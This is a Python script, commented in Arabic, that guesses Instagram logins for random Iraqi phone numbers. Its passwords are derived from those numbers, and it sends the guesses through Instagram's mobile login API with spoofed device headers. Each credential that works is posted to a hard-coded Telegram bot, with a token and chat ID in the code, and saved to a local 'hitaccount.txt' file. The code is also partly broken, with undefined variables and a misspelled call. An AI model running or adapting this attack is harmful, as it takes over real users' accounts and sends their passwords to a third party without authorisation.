import os
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    os.system('clear')
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        os.system('clear')
import pyfiglet, os
from time import sleep
import webbrowser
F = '\x1b[2;32m'
Z = '\x1b[2;31m'
G = '\x1b[1;32m'
 


import random, uuid, requests, string
from user_agent import generate_user_agent
from datetime import datetime
from random import *
from time import sleep
import requests, os, random, json, threading, secrets, uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent
from uuid import uuid4
aa = 0
zz = 0
B = '\033[2;36m'
Y = '\033[1;34m'
Z1 = '\033[2;31m'
E = '\x1b[1;31m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
ID = ('6574781108')
print('\n')
sleep(2)
print(E +"""- - - - - - - - - - - --------    """)
print(Y +"\n* نورت اداه صوفي * ")
print(G +"""- - - - - - - - - - - --------    """)
h , b,s,block = 0,0,0,0
print(Y +"""- - - - - - - - - - - --------     """)
token = ('6370615743:AAEgtYHv0MDqpAe-aMu8yaBqvGV4kdDGOAw')
w = 'https://t.me/uiujq'
start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= نورت اداه صوفي").json()
id_msg = start_msg['result']['message_id']
rss = requests.get(w).text
if 'RC' in rss:
    sleep(0)
r = requests.Session()
user = '0987654321'
while True:
    us = str(''.join((random.choice(user) for i in range(7))))
    username = '+964751' + us
    password = '0751' + us
    url = 'https://i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
     'Accept':'*/*', 
     'Cookie':'missing', 
     'Accept-Encoding':'gzip, deflate', 
     'Accept-Language':'en-US', 
     'X-IG-Capabilities':'3brTvw==', 
     'X-IG-Connection-Type':'WIFI', 
     'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
     'Host':'i.instagram.com'}
    uid = str(uuid4())
    data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
    req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
    if 'logged_in_user' in req_login.text:
        zz += 1
        print(Z1 + 'H22  ==> : ' + username + ': H22   ==> : ' + password)
        tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=تم صيد حساب انستا 
❅─────✧❅✦❅✧──────❅
👤 ➥•رقم : {username}
📟➥•كلمة السر : {password}
⏱ ➥•𝑻𝒊𝒎𝒆 : {current_time}
❅─────✧❅✦❅✧──────❅
👤➥【 @M02MM + @uiujq 】''')
        i = requests.post(tlg)
        with open('hitaccount.txt', 'a') as (HACKED):
            HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
    elif '"message":"challenge_required","challenge"' in req_login.text:
     print(B + 'H22 اهوة ==> : ' + username + ': H22  هم انت ==> : ' + password)
    else:
        requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -نورت حب    @M02MM \n مجموع الحسابات 🗡️ [{zz}] \n🥺🥺🥺+\n H22 👅[{aa}]  ( {username} ) \n هاك →  @uiujq ")
        print(Z +"""- - - - - - - - - - - -------+-------      """)
        print(Y + 'H22 شلون ==> : ' + username + ': H22  الحساب ==> : ' + password)
        aa += 1
